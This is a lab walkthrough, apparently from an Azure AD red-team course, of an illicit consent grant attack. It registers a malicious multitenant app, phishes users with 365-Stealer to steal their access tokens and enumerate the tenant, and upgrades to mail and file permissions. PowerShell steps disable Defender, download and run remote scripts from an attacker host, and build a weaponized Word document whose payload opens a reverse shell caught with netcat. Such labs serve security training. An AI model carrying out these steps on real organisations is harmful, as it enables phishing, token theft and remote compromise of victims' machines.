## Objective 9 ***Part of - Kill Chain - 1***



- Register a multitenant application attacker in defcorpextcontractors tenant
- Provide the redirect URI where you would like to receive tokens. `https://172.16.151.X/login/authorized`
![test](/img/obj9.png "Enumeration")
- Go to the `Certificates&Secrets` blade and create new client secret. Copy the client secret before browsing away from the page
![test](/img/obj91.png "Enumeration")
- Go to the `API permissions` blade and add the following Delegated permissions for;
    - `Microsoft Graph:user.read`
    - `User.ReadBasic.All`
    ![test](/img/obj92.png "Enumeration")
- Go to the OverView blade and note Application (Client) ID
    ![test](/img/obj93.png "Enumeration")
- Check if users are allowed to consent to apps
```powershell
Import-Module C:\AzAD\Tools\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "SuperS3Cr31PAssw0rd!@l33t" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com",$passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
- Setup o365-Stealer
![test](/img/obj94.png "Enumeration")
- Send the phishing link
- Get access tokens of the victims
![test](/img/obj95.png "Enumeration")
- Use it in the below code to enumerate all the users. This gives us a list of targets in the target organization. Remember that we can do only the actions allowed by the permissions on the token.
```powershell
$Token = 'eyJ0eX..'
$URI = 'https://graph.microsoft.com/v1.0/users'
$RequestParams = @{
  Method = 'GET'
  Uri = $URI
  Headers = @{
    'Authorization' = "Bearer $Token"
  }
}
(Invoke-RestMethod @RequestParams).value
```
- Get admin consent
- Go to the `API permissions` blade and add the following Delegated permissions for;
    - `Microsoft Graph:user.read`
    - `User.ReadBasic.All`
    - `mail.read`
    - `notes.read.all`
    - `mailboxsettings.readwrite`
    - `files.readwrite.all`
    - `mail.send`
- Setup [365-Stealer](#365-Stealer) via GUI or cli
- Send the phishing link
![test](/img/obj96.png "Enumeration")
- Upload the attackerx.doc 
- Browse to the 365-stealer dashboard `http://localhost:82/` and copy the access token for admin user. Use this token to upload weaponized word file on admin's drive.
- Create doc file from attacker VM, run the below command to access MS Office's machine.
    ```powershell
    $passwd = ConvertTo-SecureString "ForCreatingWordDocs@123" -AsPlainText -Force
    $creds = New-Object System.Management.Automation.PSCredential("office-vm\administrator",$passwd)
    $officeVM = New-PSSession -ComputerName 172.16.1.250 -Credential $creds
    Enter-PSSession -Session $officeVM
    Set-MpPreference -DisableRealtimeMonitoring $true
    iex(New-Object Net.Webclient).downloadstring("http://172.16.150.x:82/Out-Word.ps1")

    # Create the word document
    Out-Word -Payload "powershell iex(New-Object Net.WebClient).downloadstring('http://172.16.150.x:82/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress 172.16.150.x -Port 4444" -OutputFile attackerx.doc
    exit
    
    # copy the generated file to the attacker VM
    Copy-Item -FromSession $officeVM -Path C:\Users\Administrator\Documents\attackerx.doc -Destination C:\AzAD\Tools\attackerx.doc

    # Start the nc listener
    C:\AzAD\Tools\netcat-win32-1.12\nc64.exe -lvp 4444
    ```
- Got a reverse shell when uploaded `studentx.doc` file from the `365-stealer` UI.
  ![test](/img/illicit_2.png "Illicit Consent Grant Attack")
